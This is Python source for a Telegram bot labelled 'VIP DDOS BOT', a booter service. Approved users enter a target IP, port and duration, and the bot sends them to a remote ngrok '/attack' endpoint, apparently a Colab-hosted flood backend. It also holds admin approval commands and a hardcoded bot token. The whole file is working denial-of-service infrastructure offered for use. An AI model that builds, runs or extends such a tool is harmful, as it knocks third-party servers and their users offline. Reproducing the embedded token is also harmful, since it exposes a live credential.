import os
import json
import logging
import threading
import time
import requests
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from flask import Flask
from threading import Thread

# Logging & Flask Setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
app = Flask('')
@app.route('/')
def home(): return "Bot is Live!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIGURATION ---
BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
ADMIN_IDS = [7529105228]
COLAB_API_URL = "https://bubble-sponge-unpicked.ngrok-free.dev/attack"

# --- GLOBAL DATA ---
MAINTENANCE_MODE = False
COOLDOWN_DURATION = 40
MAX_ATTACKS = 40
temp_data = {}

# --- JSON HELPERS ---
def load_json(file, default):
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return default

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {str(ADMIN_IDS[0]): {"username": "admin"}})

# --- CORE LOGIC ---
def trigger_colab(ip, port, duration):
    try: requests.get(COLAB_API_URL, params={'host': ip, 'port': port, 'time': duration}, timeout=2)
    except: pass

def get_main_keyboard(uid):
    keyboard = [[KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")],
                [KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")]]
    if str(uid) in owners:
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text("🤖 **VIP DDOS BOT**\nSelect an option:", reply_markup=get_main_keyboard(uid))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    if text == "🎯 Launch Attack":
        temp_data[uid] = {"step": "ip"}
        await update.message.reply_text("🎯 **ATTACK**\nSend Target IP:")
    
    elif text == "👥 User Management":
        await update.message.reply_text("➕ **Approval Dene ke liye ID bheje:**\n(Example: `/approve 12345678`)")

    elif text == "⚙️ Bot Settings":
        global MAINTENANCE_MODE
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        await update.message.reply_text(f"🔧 Maintenance Mode: {'ON' if MAINTENANCE_MODE else 'OFF'}")

    elif uid in temp_data:
        step = temp_data[uid].get("step")
        if step == "ip":
            temp_data[uid].update({"ip": text, "step": "port"})
            await update.message.reply_text("✅ IP Set. Now send Port:")
        elif step == "port":
            temp_data[uid].update({"port": text, "step": "time"})
            await update.message.reply_text("✅ Port Set. Now send Time (s):")
        elif step == "time":
            ip, port = temp_data[uid]["ip"], temp_data[uid]["port"]
            trigger_colab(ip, port, text)
            del temp_data[uid]
            await update.message.reply_text(f"🚀 **ATTACK STARTED!**\nTarget: `{ip}:{port}`\nTime: `{text}s`")

# --- ADMIN COMMANDS ---
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in owners: return
    try:
        target_id = context.args[0]
        approved_users[target_id] = {"expiry": "LIFETIME"}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User `{target_id}` Approved!")
    except:
        await update.message.reply_text("❌ Use: `/approve <id>`")

def main():
    keep_alive()
    app_tg = Application.builder().token(BOT_TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CommandHandler("approve", approve))
    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app_tg.run_polling()

if __name__ == '__main__': main()
